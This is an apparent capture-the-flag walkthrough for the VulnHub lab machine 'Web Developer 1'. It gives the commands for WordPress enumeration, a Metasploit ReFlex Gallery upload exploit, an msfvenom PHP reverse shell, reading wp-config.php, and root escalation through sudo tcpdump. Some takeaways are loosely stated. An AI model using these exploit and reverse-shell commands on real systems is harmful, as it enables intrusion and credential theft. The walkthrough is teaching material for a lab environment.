# Web Developer 1: OSCP Walkthrough

> **Machine:** Web Developer 1
> **Source:** VulnHub (by rebootuser)
> **IP Address:** 192.168.x.x (DHCP)
> **OS:** Linux
> **Difficulty:** Intermediate
> **Focus:** WordPress exploitation, wpscan, privilege escalation via tcpdump

---

## Recon

```bash
# Discover target IP
sudo netdiscover -i eth0

# Full nmap scan with service detection
nmap -sV -sC -p- 192.168.x.x

# Quick targeted scan
nmap -sV -sC -p 22,80 192.168.x.x
```

**Expected results:**
- Port 22: SSH (OpenSSH)
- Port 80: HTTP (Apache + WordPress)

---

## Enumeration

### Web Enumeration

```bash
# Run nikto for web server vulnerability scanning
nikto -h http://192.168.x.x

# Gobuster directory enumeration
gobuster dir -u http://192.168.x.x -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,old,zip

# WordPress-specific scanning with wpscan
wpscan --url http://192.168.x.x --enumerate u,vp,vt,dbe --api-token <YOUR_TOKEN>

# Check WordPress version
wpscan --url http://192.168.x.x --enumerate v
```

### WordPress Enumeration (no API token)

```bash
# Enumerate users via REST API
curl http://192.168.x.x/wp-json/wp/v2/users

# Enumerate users via wpscan
wpscan --url http://192.168.x.x --enumerate u

# Check the source code for clues
curl http://192.168.x.x/robots.txt
curl http://192.168.x.x/sitemap.xml

# Check WordPress readme.html for version
curl http://192.168.x.x/readme.html
```

> **Screenshots:** See Key Takeaways section

---

## Exploitation

### Step 1: Find the .cap File (Wireshark Credential Capture)

```bash
# After finding a directory with gobuster, look for a .cap file
# Example: http://192.168.x.x/files/capture.cap

# Download or view in browser
# Open in Wireshark:
#   File -> Open -> capture.cap
# Filter: http.request or ftp || telnet || ssh
# Look for credentials in plaintext protocols
```

### Step 2: Login to WordPress

Using credentials extracted from the `.cap` file:
```bash
# Open the WordPress login page
# http://192.168.x.x/wp-login.php

# Login with extracted credentials
username: (from Wireshark capture)
password: (from Wireshark capture)
```

### Step 3: Upload & Exploit Vulnerable Plugin

```bash
# On WordPress dashboard, install the vulnerable plugin:
# "ReFlex Gallery" (known vulnerable to file upload)

# Or exploit directly via Metasploit:
msfconsole -q

use exploit/unix/webapp/wp_reflexgallery_file_upload
set rhosts 192.168.x.x
set targeturi /
exploit
```

### Step 4: Extract SSH Credentials from wp-config

```bash
# Once you have a shell via Metasploit:
# Navigate to WordPress configuration file
cat /var/www/html/wp-config.php

# Look for:
# DB_USER, DB_PASSWORD, AUTH_KEY, SECURE_AUTH_KEY
# These may also be SSH credentials
```

### Step 5: SSH Login

```bash
# SSH with credentials from wp-config.php
ssh <extracted_user>@192.168.x.x

# If password from wp-config doesn't work directly,
# try the WordPress database credentials or .cap file credentials
```

### Manual Webshell Upload (Alternative)

```bash
# Upload a PHP reverse shell to the vulnerable plugin directory
# Example using msfvenom:
msfvenom -p php/reverse_php LHOST=<your_ip> LPORT=4444 -f raw > shell.php

# Upload via WordPress theme/plugin editor or file upload vulnerability
# Then access the shell:
# curl http://192.168.x.x/wp-content/plugins/vulnerable-plugin/shell.php
```

## Privesc

### Privilege Escalation via tcpdump

The user can run `tcpdump` as root via sudo. Use a GTFOBins technique:

```bash
# Check sudo privileges
sudo -l
# Expected output: user ALL=(ALL) /usr/sbin/tcpdump

# Method 1: tcpdump -G execution
COMMAND='cat /root/root.txt'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF

# In one terminal, run tcpdump with -z to execute the script
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF

# In another terminal, send a packet to trigger execution
nc -v -z -n -w 1 127.0.0.1 1
```

### Alternative Privesc Methods

```bash
# Check for other GTFOBins opportunities
# If python is available with sudo:
sudo python3 -c 'import os; os.system("/bin/bash")'

# If vim is available with sudo:
# Open :!/bin/bash inside vim

# If vim is available without sudo but for config write:
# Write SSH key to authorized_keys

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check writable sudoers scripts
sudo -l 2>&1 | tee sudo_check.txt
```

### Read Root Flag

```bash
# After successful privesc
cat /root/root.txt
```

> **Screenshots:** See Key Takeaways section

---

## Key Takeaways

1. **.cap files are gold**: they often contain plaintext credentials captured from network traffic.
2. **Wireshark / tcpdump**: analyzing capture files for credentials is a common OSCP technique.
3. **WordPress plugin vulnerabilities**: the ReFlex Gallery upload exploit is a reliable entry point.
4. **wp-config.php** contains database credentials which may overlap with SSH or application credentials.
5. **tcpdump for privesc** is a classic WordPress machine technique: when a user can run tcpdump as root, use the `-z` flag to execute arbitrary commands.
6. **Always run wpscan**: it automates WordPress enumeration and vulnerability discovery.
7. **ReFlex Gallery file upload** bypasses plugin restrictions to upload a PHP reverse shell.

---

*M4d3 w1th ❤️ by Ankit Patidar*
